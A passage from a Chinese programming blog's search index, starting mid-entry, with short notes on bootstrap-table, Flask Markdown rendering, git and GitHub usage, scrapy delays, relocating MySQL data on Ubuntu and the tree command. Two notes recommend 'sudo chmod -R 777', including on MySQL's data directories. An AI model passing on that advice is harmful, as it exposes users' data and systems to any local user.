class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;table data-row-style&#x3D;&quot;statestyle&quot; data-toggle&#x3D;&quot;table&quot; data-url&#x3D;&quot;tables&#x2F;new_report1.json&quot; data-show-refresh&#x3D;&quot;true&quot; data-show-toggle&#x3D;&quot;true&quot; data-show-columns&#x3D;&quot;true&quot; data-search&#x3D;&quot;true&quot; data-select-item-name&#x3D;&quot;toolbar1&quot; data-pagination&#x3D;&quot;true&quot; data-sort-name&#x3D;&quot;id&quot; data-sort-order&#x3D;&quot;desc&quot;&gt;</span><br><span class="line">&lt;thead&gt;</span><br><span class="line">&lt;span style&#x3D;&quot;white-space:pre&quot;&gt; &lt;&#x2F;span&gt;&lt;tr&gt;</span><br><span class="line">&lt;span style&#x3D;&quot;white-space:pre&quot;&gt; &lt;&#x2F;span&gt;&lt;th data-field&#x3D;&quot;state&quot; data-checkbox&#x3D;&quot;true&quot;&gt;&lt;span&gt;编号&lt;&#x2F;span&gt;&lt;&#x2F;th&gt;</span><br><span class="line">&lt;th data-field&#x3D;&quot;id&quot; data-sortable&#x3D;&quot;true&quot;&gt;&lt;span&gt;编号&lt;&#x2F;span&gt;&lt;&#x2F;th&gt;</span><br><span class="line">&lt;th data-field&#x3D;&quot;report_man&quot; data-sortable&#x3D;&quot;true&quot;&gt;&lt;span&gt;报修人&lt;&#x2F;span&gt;&lt;&#x2F;th&gt;</span><br><span class="line">&lt;th data-field&#x3D;&quot;phone_number&quot; data-sortable&#x3D;&quot;true&quot;&gt;&lt;span&gt;联系电话&lt;&#x2F;span&gt;&lt;&#x2F;th&gt;</span><br><span class="line">&lt;th data-field&#x3D;&quot;report_date&quot; data-sortable&#x3D;&quot;true&quot;&gt;&lt;span&gt;报修时间&lt;&#x2F;span&gt;&lt;&#x2F;th&gt;</span><br><span class="line">&lt;th data-field&#x3D;&quot;order_date&quot; data-sortable&#x3D;&quot;true&quot;&gt;&lt;span&gt;预约时间&lt;&#x2F;span&gt;&lt;&#x2F;th&gt;</span><br><span class="line">&lt;th data-field&#x3D;&quot;allot_time&quot; data-sortable&#x3D;&quot;true&quot;&gt;&lt;span&gt;分派时间&lt;&#x2F;span&gt;&lt;&#x2F;th&gt;</span><br><span class="line">&lt;th data-field&#x3D;&quot;complete_date&quot; data-sortable&#x3D;&quot;true&quot;&gt;&lt;span&gt;完成时间&lt;&#x2F;span&gt;&lt;&#x2F;th&gt;</span><br><span class="line">&lt;th data-field&#x3D;&quot;service_unit&quot; data-sortable&#x3D;&quot;true&quot;&gt;&lt;span&gt;所属中心&lt;&#x2F;span&gt;&lt;&#x2F;th&gt;</span><br><span class="line">&lt;th data-field&#x3D;&quot;report_state&quot; data-sortable&#x3D;&quot;true&quot; data-formatter&#x3D;&quot;displaycolor&quot;&gt;&lt;span&gt;状态&lt;&#x2F;span&gt;&lt;&#x2F;th&gt;&lt;&#x2F;span&gt;</span><br><span class="line">&lt;&#x2F;tr&gt;</span><br><span class="line">&lt;&#x2F;thead&gt;</span><br><span class="line">&lt;&#x2F;table&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">function displaycolor(value,row,index) &#123;</span><br><span class="line">var a &#x3D; &quot;&quot;;</span><br><span class="line">if(value &#x3D;&#x3D; &quot;已完成&quot;) &#123;</span><br><span class="line">var a &#x3D; &#39;&lt;span style&#x3D;&quot;color:#00ff00&quot;&gt;&#39;+value+&#39;&lt;&#x2F;span&gt;&#39;;</span><br><span class="line">&#125;else if(value &#x3D;&#x3D; &quot;已分派&quot;)&#123;</span><br><span class="line">var a &#x3D; &#39;&lt;span style&#x3D;&quot;color:#0000ff&quot;&gt;&#39;+value+&#39;&lt;&#x2F;span&gt;&#39;;</span><br><span class="line">&#125;else if(value &#x3D;&#x3D; &quot;待办&quot;) &#123;</span><br><span class="line">var a &#x3D; &#39;&lt;span style&#x3D;&quot;color:#FF0000&quot;&gt;&#39;+value+&#39;&lt;&#x2F;span&gt;&#39;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">var a &#x3D; &#39;&lt;span&gt;&#39;+value+&#39;&lt;&#x2F;span&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">return a;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;th data-field&#x3D;&quot;report_state&quot; data-sortable&#x3D;&quot;true&quot; data-formatter&#x3D;&quot;displaycolor&quot;&gt;&lt;span&gt;状态&lt;&#x2F;span&gt;&lt;&#x2F;th&gt;&lt;&#x2F;span&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> bootstrap-table </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask 解析markdown页面</title>
      <link href="2020/04/22/2020-04-22-flask_parse_markdown/"/>
      <url>2020/04/22/2020-04-22-flask_parse_markdown/</url>
      
        <content type="html"><![CDATA[<h2 id="flask-解析markdown页面"><a href="#flask-解析markdown页面" class="headerlink" title="flask 解析markdown页面"></a>flask 解析markdown页面</h2><p>使用Python第三方库Markdown解析</p><p>安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">方法一：</span><br><span class="line">easy_install markdown</span><br><span class="line"></span><br><span class="line">方法二：下载包安装</span><br><span class="line">地址：http:&#x2F;&#x2F;pypi.python.org&#x2F;packages&#x2F;source&#x2F;M&#x2F;Markdown&#x2F;</span><br><span class="line">如最新的包是：Markdown-2.3.1.tar.gz</span><br><span class="line"></span><br><span class="line">wget http:&#x2F;&#x2F;pypi.python.org&#x2F;packages&#x2F;source&#x2F;M&#x2F;Markdown&#x2F;Markdown-2.3.1.tar.gz</span><br><span class="line">tar xvzf Markdown-2.3.1.tar.gz</span><br><span class="line">cd markdown-2.3.1&#x2F;</span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> markdown</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md2html</span>(<span class="params">text</span>):</span></span><br><span class="line">    <span class="keyword">return</span> markdown.markdown(text)</span><br></pre></td></tr></table></figure><p>或则直接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m markdown text</span><br></pre></td></tr></table></figure><p>于是在flask中 可以定义一个过滤器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@app.template_filter(&quot;md2html&quot;)</span><br><span class="line"></span><br><span class="line">def md2html(text):</span><br><span class="line"></span><br><span class="line">return markdown.markdown(text)</span><br></pre></td></tr></table></figure><p>在html中使用，例如text是markdown文本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;text|md2html&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
            <tag> web </tag>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git 分支管理</title>
      <link href="2020/04/22/2020-04-22-git_branch_management/"/>
      <url>2020/04/22/2020-04-22-git_branch_management/</url>
      
        <content type="html"><![CDATA[<h2 id="Git-分支管理"><a href="#Git-分支管理" class="headerlink" title="Git 分支管理"></a>Git 分支管理</h2><p>git分支：分支就是从主线上分离出来进行另外的操作，而又不影响主线，主线又可以继续干它的事，最后分支做完事后合并到主线上而分支的任务完成可以删掉了。主线继续做它的事，分支用来解决临时需求，二者互不相干。</p><p>创建分支命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch (branchname)</span><br></pre></td></tr></table></figure><p>切换分支命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout (branchname)</span><br></pre></td></tr></table></figure><p>当你切换分支的时候，Git 会用该分支的最后提交的快照替换你的工作目录的内容， 所以多个分支不需要多个目录。</p><p>删除分支命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -d (branchname)</span><br></pre></td></tr></table></figure><p>一旦某分支有了独立内容，你终究会希望将它合并回到你的主分支。 你可以使用以下命令将任何分支合并到主分支中去：</p><p>合并分支命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git merge </span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git merge newtest</span><br></pre></td></tr></table></figure><p>将 newtest 分支合并到主分支去，合并完后就可以删除分支:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -d newtest</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>github 删除文件夹</title>
      <link href="2020/04/22/2020-04-22-github_delete_folder/"/>
      <url>2020/04/22/2020-04-22-github_delete_folder/</url>
      
        <content type="html"><![CDATA[<h2 id="github-删除文件夹"><a href="#github-删除文件夹" class="headerlink" title="github 删除文件夹"></a>github 删除文件夹</h2><p>在github上只能删除仓库,却无法删除文件夹, 所以只能通过命令来解决。</p><p>1.首先进入master文件夹下</p><p>2.将远程仓库里面的项目拉下来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull origin master </span><br></pre></td></tr></table></figure><p>3.删除xxxx文件夹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rm -r --cached xxxx</span><br></pre></td></tr></table></figure><p>4.提交操作说明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m &#39;删除了xxxx&#39; </span><br></pre></td></tr></table></figure><p>5.将本次更改更新到github项目上去，删除完毕</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>github 项目的语言显示设置</title>
      <link href="2020/04/22/2020-04-22-github_project_language_display_settings/"/>
      <url>2020/04/22/2020-04-22-github_project_language_display_settings/</url>
      
        <content type="html"><![CDATA[<h2 id="github-项目的语言显示设置"><a href="#github-项目的语言显示设置" class="headerlink" title="github 项目的语言显示设置"></a>github 项目的语言显示设置</h2><p>github上的项目语言是自动识别的，也就是你某种语言的占比最多，就会自动识别为那种语言，这个方式显然不合适，比如说我的一个python项目，但是里面存储了一些html网页文件，结果项目被错误的识别成了html语言项目，通过新建.gitattributes文件可以配置。</p><p>例如，如果想让整个项目显示为python项目, 需要进行以下步骤的设置</p><p>1.在根目录下创建一个文件 .gitattributes</p><p>2.在 .gitattributes 内编辑以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*.js linguist-language&#x3D;python</span><br><span class="line">*.css linguist-language&#x3D;python</span><br><span class="line">*.html linguist-language&#x3D;python</span><br></pre></td></tr></table></figure><p>3.提交并保存修改 .gitattribute 文件</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>html 在网页中内嵌HTML</title>
      <link href="2020/04/22/2020-04-22-html_inner_HTML_in_web_pages/"/>
      <url>2020/04/22/2020-04-22-html_inner_HTML_in_web_pages/</url>
      
        <content type="html"><![CDATA[<h2 id="html-在网页中内嵌HTML"><a href="#html-在网页中内嵌HTML" class="headerlink" title="html 在网页中内嵌HTML"></a>html 在网页中内嵌HTML</h2><p>利用HTML iframe 标签。iframe 元素会创建包含另外一个文档的内联框架（即行内框架）。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span>  <span class="attr">id</span>=<span class="string">&quot;main&quot;</span> <span class="attr">name</span>=<span class="string">&quot;main&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span> <span class="attr">srcdoc</span>=<span class="string">&quot;&#123;&#123; value|md2html&#125;&#125;&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:100%;height:100%;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在网页中内嵌了一段将markdown转为html的内容。</p><p>常用参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">src：文件的路径，既可是HTML文件，也可以是文本、ASP等；</span><br><span class="line">srcdoc:规定在 &lt;iframe&gt; 中显示的页面的 HTML 内容;</span><br><span class="line">width、height：&quot;内部框架&quot;区域的宽与高；</span><br><span class="line">scrolling:当SRC的指定的HTML文件在指定的区域不显不完时，滚动选项，如果设置为NO，则不出现滚动条；如为 Auto：则自动出现滚动条；如为Yes，则显示;</span><br><span class="line">FrameBorder：区域边框的宽度，为了让“内部框架“与邻近的内容相融合，常设置为0。</span><br><span class="line">name:框架的名字，用来进行识别。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu 文件夹右小角有锁的问题解决</title>
      <link href="2020/04/22/2020-04-22-lock_in_the_right_corner_of_ubuntu_folder/"/>
      <url>2020/04/22/2020-04-22-lock_in_the_right_corner_of_ubuntu_folder/</url>
      
        <content type="html"><![CDATA[<h2 id="Ubuntu-文件夹右小角有锁的问题解决"><a href="#Ubuntu-文件夹右小角有锁的问题解决" class="headerlink" title="Ubuntu 文件夹右小角有锁的问题解决"></a>Ubuntu 文件夹右小角有锁的问题解决</h2><p>有锁，普通用户就不能操作该文件夹。</p><p>解决办法：</p><p>sudo chmod -R 777 路径(文件夹或文件)</p>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>scrapy 设置爬取时间间隔</title>
      <link href="2020/04/22/2020-04-22-scrapy_set_crawl_time_interval/"/>
      <url>2020/04/22/2020-04-22-scrapy_set_crawl_time_interval/</url>
      
        <content type="html"><![CDATA[<h2 id="scrapy-设置爬取时间间隔"><a href="#scrapy-设置爬取时间间隔" class="headerlink" title="scrapy 设置爬取时间间隔"></a>scrapy 设置爬取时间间隔</h2><p>当使用scrapy大规模爬取某一站点的页面时，有时候会因爬取过于频繁而被封IP，导致出现400等错误。</p><p>此时的解决思路之一就是让蜘蛛在访问网址中间休息1~2秒。</p><p>对于单个爬虫 设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">custom_settings &#x3D; &#123;</span><br><span class="line">    &#39;DOWNLOAD_DELAY&#39; : 2,</span><br><span class="line">&#39;RANDOMIZE_DOWNLOAD_DELAY&#39;: True</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者对于全局，在settings.py中添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DOWNLOAD_DELAY &#x3D; 2</span><br><span class="line">RANDOMIZE_DOWNLOAD_DELAY &#x3D; True</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> scrapy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu git安装及使用</title>
      <link href="2020/04/22/2020-04-22-ubuntu_git_installation_and_use/"/>
      <url>2020/04/22/2020-04-22-ubuntu_git_installation_and_use/</url>
      
        <content type="html"><![CDATA[<h2 id="ubuntu-git安装及使用"><a href="#ubuntu-git安装及使用" class="headerlink" title="ubuntu git安装及使用"></a>ubuntu git安装及使用</h2><h3 id="一、git安装"><a href="#一、git安装" class="headerlink" title="一、git安装"></a>一、git安装</h3><p>首先需要注册一个全球最大同性交友网站github账号</p><p>打开终端，安装git</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install git</span><br></pre></td></tr></table></figure><p>配置git账号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;git的用户名&quot;</span><br><span class="line">git config --global user.email &quot;git的邮箱&quot;</span><br></pre></td></tr></table></figure><p>根据用户名及邮箱生成密钥(该密钥会用在该账号中)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;git的邮箱&quot;</span><br></pre></td></tr></table></figure><p>查看刚刚目录下的密钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat 存放目录&#x2F;id_rsa.pub</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010454.png" alt="Screenshot from 2020-04-21 17-29-12"></p><p>复制密钥,注意别复制邮箱</p><p>打开<a href="https://github.com/%E7%BD%91%E7%AB%99,%E7%99%BB%E9%99%86%E4%BD%A0%E7%9A%84%E8%B4%A6%E5%8F%B7%EF%BC%8C%E8%BF%9B%E5%85%A5settings-SSH">https://github.com/网站,登陆你的账号，进入settings-SSH</a> and GPG  keys</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010500.png" alt="Screenshot from 2020-04-21 17-43-14"></p><p>输入个标题,然后复制粘贴你的密钥</p><p>检测是否可用ssh -T <a href="mailto:&#103;&#x69;&#116;&#x40;&#x67;&#x69;&#x74;&#104;&#117;&#x62;&#46;&#99;&#x6f;&#109;">&#103;&#x69;&#116;&#x40;&#x67;&#x69;&#x74;&#104;&#117;&#x62;&#46;&#99;&#x6f;&#109;</a></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010510.png" alt="Screenshot from 2020-04-21 17-45-22"></p><p>这就表示成功了，就可以在本机上传及更新github项目。</p><h3 id="二、git上传"><a href="#二、git上传" class="headerlink" title="二、git上传"></a>二、git上传</h3><p>在github中新建项目</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010514.png" alt="Screenshot from 2020-04-21 17-49-08"></p><p>在本地创建一个项目目录并进入</p><p>当我们需要给新的项目respository上传内容时，需要使用init命令将我们需要上传的目录初始化     </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure><p>链接远程仓库: git remote add origin <a href="mailto:&#x67;&#x69;&#x74;&#64;&#103;&#x69;&#116;&#104;&#x75;&#98;&#46;&#x63;&#x6f;&#x6d;">&#x67;&#x69;&#x74;&#64;&#103;&#x69;&#116;&#104;&#x75;&#98;&#46;&#x63;&#x6f;&#x6d;</a>:用户名/新建github项目名.git </p><p>在本地项目目录中执行命令，将需要上传到远程仓库的文件写在add后面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add test.txt</span><br></pre></td></tr></table></figure><p>将add后的文件提交到本地仓库  git commit -m “提交的信息”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m &quot;测试上传&quot;</span><br></pre></td></tr></table></figure><p>将提交的内容同步至github上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><p>这里可能会遇到问题：</p><p>问题1：git上传位置出错</p><p> 解决:修改配置文件</p><pre><code>1.进入当前共享文件的 .git 目录    cd .git2.编辑 config      vim config3.将url地址改成github中项目的 ssh地址4.保存并退出5.再次提交, 不需要输入账号密码)</code></pre><p>问题2：新建项目时选择了新建README.md文件，而github中的README.md文件不在本地代码目录中</p><p> 解决:先pull README.md文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull --rebase origin master</span><br></pre></td></tr></table></figure><p>解决问题后，再执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><p>测试文件成功上传至github。</p><h3 id="三、总结上传步骤"><a href="#三、总结上传步骤" class="headerlink" title="三、总结上传步骤"></a>三、总结上传步骤</h3><p>在当前项目的目录中生成本地的git管理库，我们可以发现在当前目录下多了一个.git的隐藏文件夹。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init </span><br></pre></td></tr></table></figure><p>查看能被上传的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure><p>将项目中所有的文件添加到仓库中，如果有的文件之前已经添加了，它会自动省略。如果想添加特定文件，把.换成对应的文件名就行了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add . </span><br></pre></td></tr></table></figure><p>本次提交的注释，双引号中的字符自定义修改。git commit 后面加 -m 表示可以直接输入提交说明，如果不加 -m ，直接输入git commit，就会弹出一个类似于 vim 的界面，让你输入提交说明。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m &quot;first commit&quot; </span><br></pre></td></tr></table></figure><p>新建一个github的仓库，在网页新建，记下地址，也就是仓库的地址，输入命令链接远程仓库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin git@github.com:用户名&#x2F;新建github项目名.git</span><br></pre></td></tr></table></figure><p>将代码上传到github仓库中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><p>参考连接：<a href="https://blog.csdn.net/edj_13/article/details/104548375">基础Git操作与GitHub协作吐血整理，收好！！！</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu 修改mysql数据库存放位置</title>
      <link href="2020/04/22/2020-04-22-ubuntu_modify_storage_location_of_mysql_database/"/>
      <url>2020/04/22/2020-04-22-ubuntu_modify_storage_location_of_mysql_database/</url>
      
        <content type="html"><![CDATA[<h2 id="ubuntu-修改mysql数据库存放位置"><a href="#ubuntu-修改mysql数据库存放位置" class="headerlink" title="ubuntu 修改mysql数据库存放位置"></a>ubuntu 修改mysql数据库存放位置</h2><p>关掉数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo &#x2F;etc&#x2F;init.d&#x2F;mysql stop</span><br></pre></td></tr></table></figure><p>提高目录权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod -R 777 &#x2F;var&#x2F;lib&#x2F;mysql</span><br><span class="line">sudo chmod -R 777 &#x2F;media&#x2F;mamba&#x2F;Data&#x2F;mysql</span><br></pre></td></tr></table></figure><p>修改其拥有者及所属群组为mysql:mysql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chown mysql:mysql &#x2F;media&#x2F;mamba&#x2F;Data&#x2F;mysql</span><br></pre></td></tr></table></figure><p>复制原数据库内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -R &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;* &#x2F;media&#x2F;mamba&#x2F;Data&#x2F;mysql</span><br></pre></td></tr></table></figure><p>修改mysql配置文件， 将datadir=/var/lib/mysql 改为 datadir=/media/mamba/Data/mysql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf </span><br></pre></td></tr></table></figure><p>修改ubuntu中的安全设置，将原来的<br>/var/lib/mysql/ r,<br>/var/lib/mysql/** rwk,<br>更换成<br>/media/mamba/Data/mysql/ r,<br>/media/mamba/Data/mysql/** rwk,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit &#x2F;etc&#x2F;apparmor.d&#x2F;usr.sbin.mysqld</span><br></pre></td></tr></table></figure><p>重启 AppArmor服务使生效(AppArmor是一个linux底层程序，负责监控linux上的应用程序，只要跟注册的资料权限不符，路径不对，就不能执行。修改完成后，要重启 AppArmor服务才能生效。)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo &#x2F;etc&#x2F;init.d&#x2F;apparmor restart</span><br></pre></td></tr></table></figure><p>重新初始化数据文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql_install_db</span><br></pre></td></tr></table></figure><p>启动MySQL数据库服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo &#x2F;etc&#x2F;init.d&#x2F;mysql start</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu下的tree指令</title>
      <link href="2020/04/21/2020-04-21-Ubuntu_tree_cmd/"/>
      <url>2020/04/21/2020-04-21-Ubuntu_tree_cmd/</url>
      
        <content type="html"><![CDATA[<h2 id="Ubuntu下的tree指令"><a href="#Ubuntu下的tree指令" class="headerlink" title="Ubuntu下的tree指令"></a>Ubuntu下的tree指令</h2><p>Linux/<em>Ubuntu</em> <em>tree</em> 命令以树形结构显示文件夹目录结构</p><p>安装</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="keyword">get</span> install tree</span><br></pre></td></tr></table></figure><p>例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ tree</span><br><span class="line">├── app.py</span><br><span class="line">├── static</span><br><span class="line">│   ├── bootstrap.min.css</span><br><span class="line">│   ├── bootstrap.min.js</span><br><span class="line">│   ├── bootstrap-table.min.css</span><br><span class="line">│   ├── bootstrap-table.min.js</span><br><span class="line">│   ├── jquery-1.12.4.js</span><br><span class="line">│   └── jquery-2.2.4.min.js</span><br><span class="line">└── templates</span><br><span class="line">    └── table.html</span><br></pre></td></tr></table></figure><p>tree -d 只显示文件夹；</p><p>tree -L n 显示项目的层级。n表示层级数。比如想要显示项目三层结构，可以用tree -l 3；</p><p>tree -I pattern 用于过滤不想要显示的文件或者文件夹。比如你想要过滤项目中的node_modules文件夹，可以使用tree -I “node_modules”；</p><p>tree &gt; tree.md 将项目结构输出到tree.md这个文件。</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
